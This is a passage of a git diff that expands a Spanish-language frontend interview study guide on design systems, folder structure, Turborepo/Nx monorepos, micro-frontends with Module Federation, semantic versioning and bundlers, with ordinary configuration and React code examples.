+  | Clickjacking | `frame-ancestors` / `X-Frame-Options` |
+  | Libs rotas | Auditar CVEs y actualizar |
+  | Open redirect | Allowlist de paths |
 
 ## 11. Testing y calidad
 
@@ -4518,6 +4721,7 @@ secretos en el bundle.
     cambio visual accidental afecta a decenas de pantallas a la vez; no
     se justifica para cada componente trivial del proyecto por el costo
     de mantener y revisar capturas de referencia.
+    Las herramientas más demandadas para testing de regresión visual son Chromatic (muy integrada con Storybook), Percy (compatible con CI y varios frameworks), y Applitools (enfoque avanzado con IA). Todas permiten comparar capturas actuales vs. aprobadas y resaltar diferencias visuales.
   - **Ejemplo** (conceptual, con una herramienta como Chromatic o
     Percy):
     ```ts
@@ -4547,6 +4751,12 @@ secretos en el bundle.
     tipografía) y sus reglas de uso en un solo lugar versionado, dando
     **consistencia** visual y **velocidad** (un equipo nuevo no
     reconstruye un botón desde cero, lo importa).
+
+    Un design system **no** es solo “una librería de
+    componentes bonitos”. Es el **contrato compartido** entre diseño y
+    ingeniería (y entre equipos de producto) sobre cómo se ve, se
+    comporta y se nombra la UI de la empresa.
+
   - **Ejemplo**: sin design system, tres equipos distintos terminan con
     tres implementaciones del "mismo" botón:
     ```tsx
@@ -4562,99 +4772,461 @@ secretos en el bundle.
     cada implementación manual una por una — con un design system, se
     actualiza un token en un solo lugar.
 
+    **Problema organizacional que resuelve**: cuando varios equipos
+    construyen features en paralelo *sin* ese contrato, cada uno
+    reinventa su botón, modal, formulario y espaciado. Aparecen tres
+    costes que crecen con el número de squads:
+    1. **Inconsistencia** — el “botón primario” se ve distinto en cada
+       pantalla; la marca se diluye y la UX se siente fragmentada.
+    2. **Duplicación** — el mismo esfuerzo (accesibilidad del modal,
+       estados del input, dark mode) se paga N veces.
+    3. **Fricción de cambio** — cambiar el color primario o el radio de
+       bordes implica un hunt & replace por todo el monorepo (o peor:
+       por varios repos) en vez de un token versionado.
+
+    Un design system ataca eso centralizando, en un lugar versionado:
+    - **Tokens de diseño**: color, tipografía, spacing, radius, elevation
+      (a menudo alineados con Figma).
+    - **Componentes** reutilizables con API estable (`Button`, `Modal`,
+      `TextField`) y comportamiento accesible acordado.
+    - **Patrones / guidelines**: cuándo usar dialog vs drawer, tono de
+      copy, densidades.
+    - **Documentación viva** (Storybook, site interno) y **gobernanza**
+      (quién puede romper el contrato, versionado semver, proceso de
+      contribución).
+
+    Capas típicas (de más abstracto a más concreto):
+
+    ```
+    Tokens  →  Primitives (Button, Input)  →  Patrones (Form layout)
+            →  Product UI (pantallas que solo componen)
+    ```
+
+    Distinción útil en entrevistas:
+    - **Component library** = el paquete de código (`@empresa/ui`).
+    - **Design system** = library + tokens + docs + reglas de uso +
+      ownership. Puedes *consumir* uno externo (MUI) o *construir* el
+      interno de la empresa encima de headless (Radix, React Aria).
+
+    Beneficios medibles: consistencia visual, velocidad de feature
+    (importar en vez de reinventar), a11y concentrada en primitives, y
+    un único punto de cambio cuando la marca evoluciona.
+
+  - **Ejemplo**: sin design system, tres equipos terminan con tres
+    “mismos” botones:
+    ```tsx
+    // Equipo A
+    <button className="btn-blue-rounded">Guardar</button>
+    // Equipo B
+    <button style={{ background: '#1a73e8', borderRadius: 8 }}>Guardar</button>
+    // Equipo C — consume el sistema
+    <Button variant="primary">Guardar</Button>
+    ```
+    Con sistema, el color primario es un token (`--color-primary`); un
+    cambio de marca actualiza el token una vez y todas las pantallas
+    heredan el cambio.
+
+  - **Cuáles son los más demandados** (mercado React / frontend senior,
+    ~2024–2026; “demandados” = aparecen en ofertas, codebases y
+    entrevistas):
+
+    | Tier | Qué | Por qué se pide |
+    |---|---|---|
+    | Muy alto | **MUI (Material UI)** | Históricamente el más citado en job posts React; admin panels, B2B, onboarding rápido. |
+    | Muy alto | **Ant Design** | Muy fuerte en dashboards enterprise y productos data-heavy; API densa “out of the box”. |
+    | Alto / en auge | **shadcn/ui + Radix + Tailwind** | Stack moderno: copias componentes a tu repo (no caja negra npm), accesibles vía Radix, fácil de brandear. Muchas startups y productos nuevos. |
+    | Alto | **Design system interno** + **Storybook** + **tokens** | Empresas medianas/grandes: el valor senior es *mantener/evolucionar* el DS de la compañía, no solo instalar MUI. |
+    | Medio-alto | **Chakra UI** | Sigue en producción y ofertas; algo menos “default” que MUI/Ant/shadcn hoy. |
+    | Medio (headless) | **Radix UI**, **React Aria**, **Headless UI** | Se piden cuando el DS es custom: comportamiento a11y listo, estilos propios. |
+    | Referencia de producto (conocer nombres) | **Material Design** (Google), **Carbon** (IBM), **Polaris** (Shopify), **Lightning** (Salesforce), **Spectrum** (Adobe) | Rara vez “instálalos tal cual” en tu app; sí salen como ejemplos de DS maduros y como inspiración de tokens/patrones. |
+
+    Regla práctica de entrevista:
+    - Startup / greenfield reciente → esperan familiaridad con
+      **shadcn/Radix/Tailwind** o un DS liviano.
+    - Enterprise / backoffice → **MUI** o **Ant** (o el DS interno
+      encima de uno de esos).
+    - Rol senior / staff en empresa con marca fuerte → experiencia
+      **construyendo o versionando** un DS interno (tokens, Storybook,
+      semver, adopción por equipos), más que saber de memoria todas las
+      props de MUI.
+
 - Estructura de carpetas feature-based vs type-based
 
-  - **Teoría**: una estructura **type-based** agrupa archivos por su tipo
-    técnico (`components/`, `hooks/`, `services/`) sin importar a qué
-    parte del negocio pertenecen. Una estructura **feature-based** agrupa
-    todo lo relacionado con una funcionalidad de negocio en una misma
-    carpeta (componentes, hooks, tipos, tests de esa feature juntos).
-    Feature-based escala mejor en proyectos grandes porque el "radio de
-    cambio" de una tarea típica (modificar el checkout) queda contenido
-    en una sola carpeta, en vez de obligar a saltar entre `components/`,
-    `hooks/` y `services/` buscando las piezas dispersas de esa misma
-    feature — y facilita borrar una feature completa sin dejar archivos
-    huérfanos regados por el proyecto.
+  - **Teoría**: son dos formas de organizar el código según **qué
+    criterio** usas para agrupar archivos.
+
+    **Type-based** (*por tipo técnico* / “layer cake”): carpetas según el
+    rol técnico del archivo — `components/`, `hooks/`, `services/`,
+    `utils/`, `types/`, `pages/`. Da igual si el archivo es de checkout o
+    de perfil: si es un hook, va a `hooks/`. Encaja con tutoriales y apps
+    chicas porque el mapa mental es simple (“¿dónde están los hooks?” →
+    una carpeta). El costo aparece al crecer: una tarea de negocio
+    (“cambiar el checkout”) te obliga a saltar por 4–6 carpetas y a
+    adivinar qué archivos pertenecen juntos; borrar una feature deja
+    huérfanos repartidos.
+
+    **Feature-based** (*por dominio / vertical slice*): todo lo de una
+    capacidad de negocio vive junto — `features/checkout/` con su UI,
+    hooks, API client, tipos y tests. El “radio de cambio” de una
+    historia típica queda contenido en una carpeta. Escalar equipos es
+    más barato: el squad de pagos casi no pisa `features/catalog`.
+    Borrar o extraer una feature a otro paquete es un move de carpeta,
+    no un scavenger hunt.
+
+    Híbrido habitual (y el más sensato en la práctica):
+    ```
+    src/
+      app/                 # shell: routing, providers, layout
+      features/            # dominio (feature-based)
+        checkout/
+        catalog/
+      shared/              # cross-cutting (type-based hacia adentro)
+        ui/                # Button, Modal (o import del design system)
+        lib/               # formatDate, http client
+        hooks/             # useMediaQuery, useDebounce
+    ```
+    Es decir: **features por dominio** + **shared por tipo** para lo que
+    realmente es transversal. Si algo “shared” solo lo usa una feature,
+    no es shared: muévelo a esa feature.
+
+    Criterio de decisión rápido:
+    - ¿El cambio típico es “tocar el checkout”? → feature-based.
+    - ¿El cambio típico es “añadir un util de fechas”? → type en
+      `shared/`.
+    - ¿La app cabe en tu cabeza y sois 1–2 devs? → type-based puro aún
+      es aceptable.
+    - ¿Varios squads / >~15 pantallas con dominio claro? → feature-based
+      (o híbrido).
+
   - **Ejemplo**:
     ```
-    # Type-based: todo el checkout está disperso en 3 carpetas distintas
+    # Type-based: el checkout está disperso
     src/
       components/CheckoutForm.tsx
       hooks/useCheckout.ts
       services/checkoutApi.ts
+      types/checkout.ts
 
-    # Feature-based: todo el checkout vive junto, es un módulo autocontenido
+    # Feature-based: el checkout es un módulo autocontenido
     src/
       features/checkout/
-        CheckoutForm.tsx
+        ui/CheckoutForm.tsx
         useCheckout.ts
         checkoutApi.ts
+        types.ts
         checkout.test.ts
+        index.ts          # API pública de la feature (barrel)
     ```
+
+  - **Qué piden / empujan hoy frameworks y ecosistemas** (demanda
+    real ~2024–2026; no es que el framework *obligue*, sino la
+    convención dominante de sus docs, starters y ofertas):
+
+    | Enfoque | Dónde se ve más / más “demandado” | Por qué |
+    |---|---|---|
+    | **Feature-based / colocation** | **Next.js (App Router)**, **Remix / React Router 7**, apps React grandes, **Nx** (libs por feature/domain), **Angular** (feature modules / standalone por dominio), **Vue 3** apps de producto, **SvelteKit** por rutas+módulos | El router ya agrupa por URL/dominio (`app/checkout/…`); colocalizar `page`, data y UI es el default moderno. Ofertas senior asumen “features/” o route groups. |
+    | **Type-based** | Tutoriales, **CRA**-era leftovers, **micro-libs** / design systems (`components/`, `hooks/`), backends tipo **NestJS** (`controllers/`, `services/` — otro mundo), prototipos y repos <~5k LOC | Simple de enseñar; en libs de UI el “tipo” *es* el dominio. En apps de producto grandes se considera deuda si no migras. |
+    | **Híbrido features + shared** | Lo que más aparece en codebases React/Next senior reales y en guías de **Feature-Sliced Design** (FSD, más rígido) o “bulletproof React” | Escala equipos sin fingir que *todo* es una feature. |
+
+    Matices por stack:
+    - **Next.js App Router**: la carpeta `app/` es *route-based*
+      (colocation por URL). Lo demandado encima es sacar dominio a
+      `features/` o `modules/` y dejar `app/` delgado (pages que
+      componen). No metas toda la lógica de negocio dentro de
+      `app/` si la app crece.
+    - **Remix / RR loaders**: colocation ruta ↔ data es natural;
+      features agrupan varias rutas del mismo dominio.
+    - **Nx / monorepos**: generators empujan **libs por dominio**
+      (`orders-data-access`, `orders-ui`) — feature-based a escala de
+      paquetes.
+    - **Angular**: históricamente *feature modules*; hoy standalone,
+      pero la organización por dominio sigue siendo la expectativa en
+      empresas.
+    - **Design system / UI kit**: casi siempre **type-based**
+      (`Button/`, `Modal/`) — correcto, porque el producto *es* el
+      catálogo de componentes.
+
+  - **Buenas prácticas**:
+    - Preferir **feature-based (o híbrido)** en apps de producto; reservar
+      type-based puro para libs UI y prototipos.
+    - Cada feature expone un **`index.ts` (barrel)** con su API pública;
+      el resto de la app no importa paths profundos de otra feature
+      (`features/checkout/internal/...`).
+    - **Prohibido** (o al menos code-review smell): que `features/a`
+      importe internos de `features/b`. Si hay acoplamiento, subir lo
+      compartido a `shared/` o crear una feature/módulo de dominio
+      común explícito.
+    - Colocar **tests junto al código** de la feature (o
+      `__tests__` dentro), no un `tests/` global gigante por tipo.
+    - Nombrar features por **lenguaje de negocio** (`checkout`,
+      `billing`), no por tecnología (`redux-stuff`, `hooks-new`).
+    - Empezar type-based y “ya migraremos” suele no migrarse: si
+      sospechas crecimiento, crea `features/` desde el día 1 aunque solo
+      haya dos.
+    - En Next: `app/` = routing/composition; `features/` = dominio;
+      `shared/ui` = primitives o re-exports del design system.
+
+  - **Recomendación** (para casi cualquier SPA/app React-Next que
+    aspira a senior/escala):
+    1. **Default: híbrido** — `features/*` por dominio + `shared/*`
+       type-based para UI transversal, utils y clients HTTP.
+    2. **Type-based puro** solo si el repo es una **librería de
+       componentes**, un spike de un fin de semana, o un script sin
+       dominio real.
+    3. Si entras a un legacy type-based grande: no reescribas todo;
+       **extrae features al tocarlas** (strangler): cada PR que toque
+       checkout mueve sus archivos a `features/checkout/`.
+
+    En una frase de entrevista: *“Type-based optimiza encontrar archivos
+    por oficio técnico; feature-based optimiza el radio de cambio del
+    negocio. En producto a escala elijo feature-based con un `shared`
+    deliberadamente pequeño.”*
 
 ### En profundidad
 
 - Monorepos con Turborepo/Nx: qué problemas resuelven
 
-  - **Teoría**: un monorepo (varios paquetes/apps en un solo repositorio
-    Git) sin herramienta especializada sufre dos problemas concretos a
-    medida que crece: **builds lentos** (reconstruir todo el repositorio
-    en cada cambio, aunque solo se haya tocado un paquete pequeño) y
-    **grafo de dependencias implícito** (no está claro qué paquete
-    interno depende de cuál, hasta que algo se rompe en cadena).
-    Turborepo y Nx resuelven ambos: cachean el resultado de builds/tests
-    por paquete (si un paquete no cambió, reutilizan el resultado
-    anterior en vez de reconstruirlo) y modelan explícitamente el grafo
-    de dependencias entre paquetes internos, permitiendo ejecutar tareas
-    solo sobre lo que realmente cambió y sus dependientes.
-  - **Ejemplo**:
+  - **Teoría**: un **monorepo** es un solo repositorio Git que contiene
+    **varias apps y/o paquetes** relacionados (p. ej. `apps/web`,
+    `apps/admin`, `packages/ui`, `packages/config`). Lo opuesto es
+    **polyrepo**: un repo por app/paquete.
+
+    El monorepo **no** es “meter todo el código de la empresa en un
+    zip”. Es una estrategia de **límites de paquete + tooling** para
+    compartir código con el mismo commit message, el mismo PR y un grafo
+    de dependencias explícito. Sin tooling, a escala duele; con
+    Turborepo/Nx, el dolor se vuelve gestionable.
+
+    **Problemas que aparecen sin orquestador** (yarn/npm workspaces
+    solos no bastan cuando crece):
+
+    1. **Builds/tests lentos e ingenuos** — un cambio en `apps/web`
+       dispara `build` de *todo* el repo en CI, aunque `packages/ui` no
+       haya cambiado.
+    2. **Grafo implícito** — “¿quién importa `@miorg/ui`?” solo se
+       descubre cuando algo rompe en cadena; no hay tarea “build solo lo
+       afectado y sus dependientes”.
+    3. **Caché inexistente o local** — el mismo `tsc`/`vite build` se
+       recalcula en cada máquina y en cada job de CI.
+    4. **DX inconsistente** — cada app tiene su script `lint`/`test` con
+       flags distintos; onboarding = arqueología de `package.json`.
+    5. (A escala enterprise) **Boundaries rotos** — cualquier app puede
+       importar internos de otra; el monorepo se convierte en un
+       monolito con carpetas, no en paquetes con contrato.
+
+    **Qué resuelven Turborepo y Nx** (la capa de *task runner* /
+    monorepo toolkit encima de workspaces):
+
+    | Capacidad | Para qué sirve |
+    |---|---|
+    | **Task graph** | Sabes que `build` de `web` depende de `build` de `ui` (`^build`). |
+    | **Affected / filtrado** | Solo corres tasks de lo que cambió (+ dependientes). |
+    | **Remote cache** | CI (y el equipo) reutilizan artefactos si inputs no cambiaron. |
+    | **Pipelines declarativas** | Un `turbo run build lint test` ordena y paraleliza. |
+    | **Convenciones** (más Nx) | Generators, tags, module boundaries, plugins por stack. |
+
+    **Turborepo vs Nx** (ambos demandados; eligen distinto trade-off):
+
+    | | **Turborepo** (Vercel) | **Nx** (Nrwl) |
+    |---|---|---|
+    | Enfoque | Ligero: cache + pipeline sobre workspaces que ya tienes | Platform: generators, graph UI, boundaries, plugins |
+    | Curva | Baja: `turbo.json` + scripts npm | Más alta: `project.json` / inferred + Nx Cloud opcional |
+    | Encaja bien | JS/TS, Next, “ya tengo apps/ + packages/” | Monorepos grandes, varios stacks, reglas estrictas entre libs |
+    | Demanda | Muy alta en startups / Next / Vercel ecosystem | Muy alta en enterprise / Angular históricamente, también React a escala |
+    | Remote cache | Vercel Remote Cache / Turborepo | Nx Cloud / self-host |
+
+    Regla mental: **Turborepo = “haz mis scripts más listos y cacheables”**;
+    **Nx = “gobierna el monorepo como producto de ingeniería”**.
+
+    **Cuándo sí monorepo + Turborepo/Nx**:
+    - 2+ apps que comparten design system, tipos de API o config ESLint/TS.
+    - Quieres un PR que cambie `Button` y vea el impacto en `web` + `admin`.
+    - CI tarda demasiado porque reconstruye de más.
+
+    **Cuándo no** (o aún no):
+    - Una sola app sin paquetes internos reales → monorepo es teatro.
+    - Equipos / ciclos de release totalmente ajenos con zero código
+      compartido → polyrepo suele ser más simple.
+    - Micro-frontends desplegados por equipos que *no* quieren acoplar
+      el ciclo de Git (ahí el problema es otro; ver el siguiente
+      epígrafe).
+
+  - **Ejemplo** (layout típico + Turborepo):
+    ```
+    repo/
+      apps/
+        web/          # Next — depende de @miorg/ui
+        admin/        # Vite — depende de @miorg/ui
+      packages/
+        ui/           # design system
+        tsconfig/     # configs compartidas
+      turbo.json
+      package.json    # workspaces: ["apps/*", "packages/*"]
+    ```
     ```json
-    // turbo.json -- declara que "build" depende del "build" de sus paquetes internos,
-    // y que su resultado puede cachearse
+    // turbo.json — pipeline: build de dependencias internas primero;
+    // outputs definen qué se cachea
     {
       "tasks": {
-        "build": { "dependsOn": ["^build"], "outputs": ["dist/**"] }
+        "build": {
+          "dependsOn": ["^build"],
+          "outputs": ["dist/**", ".next/**"]
+        },
+        "lint": {},
+        "test": { "dependsOn": ["build"] }
       }
     }
     ```
     ```bash
-    turbo run build
-    # Si "ui-kit" no cambió desde el último build, Turborepo reusa su
-    # resultado cacheado en vez de reconstruirlo -- solo reconstruye
-    # "checkout-app", que sí cambió, y lo que depende de él.
+    # Cambia solo apps/web → Turborepo/Nx puede saltarse rebuild de ui
+    # si su hash de inputs (sources + deps) no cambió
+    turbo run build --filter=web...
+    # "web..." = web + todo lo que web necesita en el grafo
+
+    # Nx equivalente conceptual
+    nx run-many -t build --projects=web
+    nx affected -t test   # solo proyectos tocados por el diff
     ```
+
+  - **Buenas prácticas**:
+    - Empieza con **workspaces nativos** (npm/pnpm/yarn) + un
+      orquestador; no inventes paths mágicos sin `package.json` por
+      paquete.
+    - Un paquete = **un contrato público** (`exports` / `main`) — las
+      apps no importan `packages/ui/src/internal/...`.
+    - Declara **outputs** de cache bien (`dist/**`, `.next/**`); si
+      olvidas outputs, la cache “acierta” pero no restaura artefactos
+      útiles.
+    - En CI: **remote cache** + `affected`/`--filter` para no pagar el
+      monorepo completo en cada PR.
+    - Preferir **pnpm** workspaces en monorepos JS (hoisting
+      controlado, disco); es lo más citado junto a Turborepo/Nx hoy.
+    - Versionar paquetes internos: o bien “siempre latest en el mismo
+      commit” (monorepo clásico), o SemVer + changesets si publicas a
+      registry (ver epígrafe de SemVer más abajo).
+    - Nx: usa **tags** + module boundary rules (`scope:orders` no
+      importa `scope:admin-internal`) para que el grafo no se pudra.
+    - Turborepo: mantén scripts **iguales por nombre** (`build`,
+      `lint`, `test`) en cada `package.json` para que el pipeline sea
+      uniforme.
+
+  - **Recomendación**:
+    - **Default moderno React/Next con 2+ apps o un DS interno** →
+      monorepo `apps/` + `packages/` + **Turborepo** (menos ceremonia).
+    - **Org grande, muchas libs, boundaries rígidos, varios frameworks**
+      → **Nx** (o Turborepo + disciplina manual fuerte; Nx te la cobra
+      en setup y te la ahorra en gobernanza).
+    - No elijas monorepo “porque está de moda”: elígelo cuando el costo
+      de *sincronizar* código compartido entre repos ya te duele más que
+      el costo de aprender el task graph.
 
 - Micro-frontends y module federation: cuándo (no) usarlos
 
-  - **Teoría**: los micro-frontends dividen una aplicación grande en
-    fragmentos desplegables **de forma independiente**, cada uno
-    mantenido por un equipo distinto. **Module federation** (de
-    Webpack/Rio) es una de las técnicas para lograrlo: permite que una
-    app cargue en runtime código JS compilado y desplegado por otra app
-    completamente distinta, como si fuera un import normal. El problema
-    organizacional real que resuelven es de **escala de equipos**:
-    cuando varios equipos grandes necesitan desplegar sus partes de la
-    app de forma independiente, sin coordinar un único release conjunto
-    que se vuelve un cuello de botella. La advertencia importante: si no
-    tienes ese problema real (equipos grandes, despliegues
-    independientes necesarios), adoptar micro-frontends solo añade
-    complejidad de infraestructura, duplicación de dependencias entre
-    fragmentos, y una experiencia de desarrollo más difícil de depurar —
-    es sobreingeniería (ver YAGNI) resolver un problema de coordinación
-    de equipos que en realidad no existe.
-  - **Ejemplo**:
+  - **Teoría**: un **micro-frontend (MFE)** parte una UI grande en
+    **fragmentos con ciclo de vida propio**: otro equipo (a menudo otro
+    repo), otro pipeline y, sobre todo, otro **deploy independiente**.
+    El usuario sigue viendo “una sola app”; por detrás son varias apps
+    compostas en runtime (o, menos habitual, en build).
+
+    No confundir con cosas parecidas:
+
+    | Concepto | Qué es | ¿Deploy independiente? |
+    |---|---|---|
+    | **Monorepo** (`apps/web` + `packages/ui`) | Varios paquetes, release Git coordinado | No (salvo que montes deploys separados a propósito) |
+    | **Code splitting** (`React.lazy`) | Trozos de *la misma* app/bundle | No |
+    | **Micro-frontends** | Varias apps compostas | **Sí** — esa es la razón de existir |
+    | **Design system como lib** | UI compartida versionada | El DS sí; la app host no hace falta |
+
+    El problema que resuelven es **organizacional**, no de moda técnica:
+    el release monolítico del frontend se vuelve cuello de botella y el
+    equipo de Checkout no puede esperar al de Catalog cada viernes.
+
+    **Module Federation** (Webpack 5; también **Rspack**, y plugins
+    análogos en Vite) es *una* técnica para lograrlo — la más citada en
+    React/Webpack enterprise. Permite que en **runtime** una app
+    (**host**/shell) haga `import('checkout/CheckoutApp')` y cargue JS
+    ya compilado y **desplegado** por otra app (**remote**), vía un
+    `remoteEntry.js`. Piezas clave:
+    - **Host**: layout, router, auth, composición.
+    - **Remote**: feature con deploy propio (checkout, seller…).
+    - **Shared**: dependencias acordadas (`react`, `react-dom`) para no
+      montar dos React en la misma página (`singleton: true`).
+
+    Otras formas de MFE (válidas en entrevista): iframes (máximo
+    aislamiento, peor UX), Web Components como borde entre frameworks,
+    composición en build/CI (menos independencia real), o composición
+    por ruta en el edge/CDN.
+
+    **Cuándo sí** (varias a la vez, no solo una):
+    1. Varios equipos (≥3–4) dueños de dominios claros.
+    2. Necesidad real de deploy independiente (cadencias/ownership
+       distintos).
+    3. El monolito frontend ya duele: colas de merge, regresiones
+       cruzadas, “release train” eterno.
+    4. Hay platform team (o equivalente) para shared: versión de React,
+       auth, design system, observabilidad.
+
+    **Cuándo no** (lo más importante a nivel senior):
+    - 1–2 equipos y un solo producto → suele bastar monorepo +
+      features + Turborepo/Nx.
+    - El dolor es solo “compartir un Button” → design system / paquete,
+      no MFE.
+    - Adoptarlo “porque suena moderno” añade version skew entre host y
+      remotes, pelea por `shared`, depuración multi-deploy y contratos
+      runtime frágiles. Es **YAGNI** resolver un problema de
+      coordinación de equipos que aún no existe.
+
+  - **Ejemplo** (host + remote con Module Federation):
     ```js
-    // webpack.config.js del "host" (la app contenedora)
+    // Host — webpack.config.js
     new ModuleFederationPlugin({
+      name: 'shell',
       remotes: {
-        checkout: 'checkout@https://checkout.miapp.com/remoteEntry.js', // otro equipo, otro deploy
+        checkout: 'checkout@https://checkout.miapp.com/remoteEntry.js',
+      },
+      shared: {
+        react: { singleton: true, requiredVersion: '^18.2.0' },
+        'react-dom': { singleton: true, requiredVersion: '^18.2.0' },
       },
     });
 
-    // Uso dentro del host: se importa como si fuera código local,
-    // pero en runtime viene de un despliegue completamente separado
+    // En el host: parece un import local; en runtime viene de otro deploy
     const CheckoutApp = React.lazy(() => import('checkout/CheckoutApp'));
     ```
+    ```js
+    // Remote — checkout (otro pipeline, otra URL)
+    new ModuleFederationPlugin({
+      name: 'checkout',
+      filename: 'remoteEntry.js',
+      exposes: {
+        './CheckoutApp': './src/CheckoutApp',
+      },
+      shared: {
+        react: { singleton: true, requiredVersion: '^18.2.0' },
+        'react-dom': { singleton: true, requiredVersion: '^18.2.0' },
+      },
+    });
+    ```
+    Paso a paso: el shell pinta layout → al entrar a `/checkout` pide el
+    `remoteEntry` → resuelve `CheckoutApp` → si `shared` cuadra,
+    reutiliza el React del host.
+
+  - **Buenas prácticas**:
+    - Contrato explícito del remote (exports estables + tipos); semver o
+      “compatible con shell ≥ x”.
+    - `react` / `react-dom` en **singleton** y majors alineados.
+    - Un design system compartido (lib o remote estable) — no cinco
+      botones distintos por equipo.
+    - Error boundary + fallback si el remote no carga (deploy a medias).
+    - Observabilidad etiquetada por remote (`remote=checkout` en RUM/logs).
+    - Empezar con **pocos** remotes (2–3); no un micro por pantalla.
+
+  - **Recomendación** (frase de entrevista): micro-frontends resuelven
+    **independencia de deploy entre equipos**; Module Federation es el
+    mecanismo runtime más común en el ecosistema Webpack/Rspack. Si el
+    dolor es compartir UI o acelerar CI, usa **monorepo + paquetes**;
+    reserva MFE para cuando el release monolítico ya es el cuello de
+    botella organizacional.
 
 - Versionado semántico de librerías internas compartidas
 
@@ -4668,18 +5240,40 @@ secretos en el bundle.
     un componente). Sin esta disciplina, un equipo que actualiza el
     design system no puede saber, sin leer el código fuente, si esa
     actualización es segura o va a romper su app.
-  - **Ejemplo**:
-    ```json
-    // Antes: Button acepta `variant="primary" | "secondary"`
-    // Después: se renombra a `type="primary" | "secondary"`
-    // Esto ROMPE a cualquier consumidor que use `variant` -> requiere un MAJOR bump
-    { "name": "@miorg/design-system", "version": "3.0.0" }
-    ```
+  - **Ejemplo** (partiendo de `@miorg/design-system@2.4.1`):
+
+    **PATCH** `2.4.1 → 2.4.2` — bugfix, mismo contrato. Los consumidores
+    no cambian código.
     ```tsx
-    // Un CHANGELOG claro, ligado al bump de versión, evita que otros
-    // equipos actualicen a ciegas y descubran el breaking change en producción
-    // v3.0.0 -- BREAKING: Button.variant renombrado a Button.type
+    // Antes (bug): el Button ignoraba disabled en variant="primary"
+    // Después: se respeta disabled; la API sigue igual
+    <Button variant="primary" disabled>Guardar</Button>
+    // package.json del DS: "version": "2.4.2"
+    // CHANGELOG: v2.4.2 -- fix: Button respeta disabled en variant primary
     ```
+
+    **MINOR** `2.4.2 → 2.5.0` — feature nueva **compatible**. El código
+    viejo sigue compilando; lo nuevo es opt-in.
+    ```tsx
+    // Se añade variant="ghost" sin quitar primary | secondary
+    <Button variant="primary">Guardar</Button>   // sigue válido
+    <Button variant="ghost">Cancelar</Button>    // nuevo
+    // package.json del DS: "version": "2.5.0"
+    // CHANGELOG: v2.5.0 -- feat: Button.variant acepta "ghost"
+    ```
+
+    **MAJOR** `2.5.0 → 3.0.0` — breaking change. Hay que migrar.
+    ```tsx
+    // Antes (v2):  <Button variant="primary" />
+    // Después: se renombra la prop → rompe a quien use variant
+    <Button type="primary" />
+    // package.json del DS: "version": "3.0.0"
+    // CHANGELOG: v3.0.0 -- BREAKING: Button.variant renombrado a Button.type
+    ```
+
+    Regla práctica al actualizar en la app consumidora:
+    - `^2.4.1` en semver de npm acepta `2.4.2` y `2.5.0`, **no** `3.0.0`.
+    - Por eso el MAJOR obliga a un bump consciente (y a leer el CHANGELOG).
 
 ## 13. Build tools y tooling moderno
 
@@ -4688,25 +5282,123 @@ secretos en el bundle.
 - Qué hace un bundler, en tres pasos
 
   - **Teoría**: un bundler resuelve tres problemas distintos, aunque a
-    menudo se piensen como uno solo. (1) **Bundling**: combina decenas o
-    cientos de archivos JS/CSS separados (con sus `import`s entre sí) en
-    un número pequeño de archivos finales, porque servir cientos de
-    archivos sueltos por HTTP es ineficiente. (2) **Transpiling**:
-    convierte sintaxis moderna de JS/TS/JSX que el navegador del usuario
-    quizás no entiende todavía, a una versión compatible (esto lo hacen
-    Babel o esbuild por debajo). (3) **Minification**: elimina espacios,
-    acorta nombres de variables y quita código muerto, reduciendo el peso
-    final del archivo sin cambiar su comportamiento.
-  - **Ejemplo**: el mismo código pasa por las tres fases:
-    ```ts
-    // Entrada: TSX moderno, varios archivos con imports entre sí
-    const saludar = (nombre: string): string => `Hola, ${nombre}`;
+    menudo se piensen como uno solo:
+
     ```
-    ```js
-    // Salida tras bundling + transpiling + minification: un archivo,
-    // sintaxis compatible, nombres acortados, sin espacios innecesarios
-    const a=e=>`Hola, ${e}`;
+    src/**/*.tsx  ──(1) graph + bundle──►  módulos unidos en chunks
+                  ──(2) transpile───────►  JS que el target entiende
+                  ──(3) minify──────────►  menos bytes (prod)
     ```
+
+    1. **Bundling**: parte de uno o pocos **entry points**, sigue los
+       `import`/`export`, arma el **grafo de módulos** y emite un número
+       pequeño de archivos finales (**chunks**). Servir cientos de
+       archivos fuente sueltos por HTTP en producción es peor para caché
+       y latencia que unos pocos chunks bien partidos.
+    2. **Transpiling**: convierte TS/JSX/sintaxis moderna a JS que el
+       navegador target entiende (esbuild, SWC, Babel por debajo).
+    3. **Minification**: quita espacios, acorta nombres y elimina código
+       muerto alcanzable (tree-shaking), sin cambiar el comportamiento.
+
+    **¿Un bundle general o un archivo por componente?** Ni lo uno ni lo
+    otro de forma absoluta. En el disco de fuente sí hay muchos
+    archivos; en **producción** el bundler **no** publica un `.js` por
+    cada componente. Publica **chunks** según el grafo:
+
+    - **Import estático** (`import { Home } from './pages/Home'`) → ese
+      módulo entra en el chunk de quien lo importa (a menudo el chunk
+      inicial). Sin code splitting, Home + Checkout + Settings pueden
+      acabar en un solo `index-*.js` grande: quien visita Home también
+      **descarga** Checkout.
+    - **`import()` dinámico** / `React.lazy` → **punto de corte**: el
+      bundler emite un chunk aparte y el navegador lo pide al navegar a
+      esa ruta. Es el modelo habitual en apps con varias rutas.
+    - **Código compartido** (`Button` usado por varias rutas) → suele ir
+      a un **shared chunk** (o quedar dentro de un vendor), no
+      duplicarse en cada ruta.
+    - **`node_modules`** (React, etc.) → a menudo un **vendor chunk**
+      con hash estable para cachear largo tiempo.
+
+    Matiz importante: en **desarrollo con Vite** el modelo es casi “un
+    módulo = una petición ESM” (el navegador pide cada archivo). Eso
+    **no** es lo que sale a producción: Vite usa Rollup y sí empaqueta
+    en chunks (ver el siguiente epígrafe).
+
+  - **Ejemplo** (app con varias rutas y un componente compartido):
+    ```
+    src/
+      main.tsx              ← entry
+      App.tsx
+      components/Button.tsx ← compartido
+      pages/Home.tsx
+      pages/Checkout.tsx
+      pages/Settings.tsx
+    ```
+
+    Sin code splitting (todo estático) → casi toda la app en el chunk
+    inicial:
+    ```tsx
+    // App.tsx — malo a escala: el usuario de Home baja también Checkout
+    import { Home } from './pages/Home';
+    import { Checkout } from './pages/Checkout';
+    import { Settings } from './pages/Settings';
+    ```
+    ```
+    dist/assets/index-abc123.js   ← Home + Checkout + Settings + Button
+    ```
+
+    Con code splitting por ruta (lo habitual):
+    ```tsx
+    // App.tsx — cada lazy() es un punto de corte para el bundler
+    import { lazy, Suspense } from 'react';
+
+    const Home = lazy(() => import('./pages/Home'));
+    const Checkout = lazy(() => import('./pages/Checkout'));
+    const Settings = lazy(() => import('./pages/Settings'));
+    ```
+    Grafo conceptual:
+    ```
+    main.tsx
